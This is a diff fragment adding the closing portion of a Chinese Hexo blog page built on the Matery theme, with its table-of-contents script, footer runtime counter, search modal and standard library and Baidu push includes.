+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
